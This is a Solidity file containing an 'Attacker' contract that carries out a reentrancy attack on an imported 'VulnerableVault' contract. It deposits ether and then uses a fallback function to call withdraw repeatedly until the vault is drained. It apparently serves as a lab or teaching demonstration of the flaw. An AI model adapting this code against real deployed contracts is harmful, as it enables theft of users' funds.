// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;

    constructor(address _vaultAddress) {
        vault = VulnerableVault(_vaultAddress);
    }

    // Triggered when the vault sends ETH
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(); // Re-entering!
        }
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }
}
